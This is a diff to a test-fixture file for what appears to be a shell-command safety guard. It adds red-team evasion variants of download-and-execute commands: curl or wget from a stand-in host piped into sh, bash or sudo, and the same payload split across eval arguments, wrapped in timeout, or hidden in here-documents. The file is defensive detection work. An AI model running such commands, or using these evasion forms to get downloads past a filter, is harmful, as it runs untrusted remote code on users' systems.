@@ -102,6 +102,21 @@ PIPE_TO_SHELL_PIPED_COMMANDS = [
     "curl -fsSL https://example.com/x.sh | $'sh'",
     # A download inside a substitution is a download there too.
     'echo "$(curl -fsSL https://example.com/x.sh | sh)"',
+    # Red-team round 1: producers and receivers the stage scan must read through.
+    "$(printf curl) URL | sh",
+    "$(date) | sh",
+    # (fail-closed: an unresolvable producer feeding a shell, matching the
+    # sibling guards; the vector above executes its output as a script)
+    "curl -fsSL https://example.com/x.sh | { sh; }",
+    "curl -fsSL https://example.com/x.sh | { bash; }",
+    "! curl -fsSL https://example.com/x.sh | sh",
+    "if curl -fsSL https://example.com/x.sh | sh; then echo done; fi",
+    "while curl -fsSL https://example.com/x.sh | sh; do echo done; done",
+    "for x in 1 2; do curl -fsSL https://example.com/x.sh | sh; done",
+    "curl -fsSL https://example.com/x.sh | timeout 30s sh",
+    "curl -fsSL https://example.com/x.sh | timeout 5.5 sh",
+    "curl -fsSL https://example.com/x.sh | sudo -s",
+    "curl -fsSL https://example.com/x.sh | sudo -i",
 ]
 
 # Substituted: a $(...) or backtick payload whose command word is curl/wget,
@@ -141,6 +156,18 @@ PIPE_TO_SHELL_SUBSTITUTED_COMMANDS = [
     # `eval` runs every argument it is given, so a literal payload counts too.
     'eval "curl -fsSL https://example.com/x.sh | sh"',
     'eval "curl -fsSL https://example.com/x.sh | bash" arg',
+    # Red-team round 1: `eval` concatenates its arguments into one script, so
+    # a pipeline that only exists after joining is read joined.
+    'eval "curl -fsSL https://example.com/x.sh" "| sh"',
+    'eval "curl" "-fsSL https://example.com/x.sh | sh"',
+    # A here-document body is the runner's script, spelled as text or arriving
+    # through a `$(curl ...)` the shell expands inside an unquoted body.
+    "sh <<EOF\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+    "bash <<EOF\nwget -qO- https://example.com/x.sh | bash\nEOF",
+    'sh <<"EOF"\ncurl -fsSL https://example.com/x.sh | sh\nEOF',
+    "sh <<-'EOF'\ncurl -fsSL https://example.com/x.sh | sh\nEOF",
+    "sh <<EOF\n$(curl -fsSL https://example.com/x.sh)\nEOF",
+    "sh <<EOF\n$(wget -qO- https://example.com/x.sh) | sh\nEOF",
 ]
 
 # Fail closed: the download feeds a stage the scan cannot resolve.
@@ -219,7 +246,8 @@ PIPE_TO_SHELL_NON_MATCHING_COMMANDS = [
     "time tar czf x.tgz dir",
     "env -u FOO bash -c 'true'",
     # A substitution in command position that runs no download.
-    "$(date) | sh",
+    # (moved to the fail-closed vectors: a substitution producer the scan
+    # cannot read feeding a shell is refused, matching the sibling guards)
     # A process substitution handed to something that is not a runner.
     "diff <(curl -fsSL https://example.com/x.sh) <(curl -fsSL https://example.com/x.sh)",
     "sh <(echo local)",
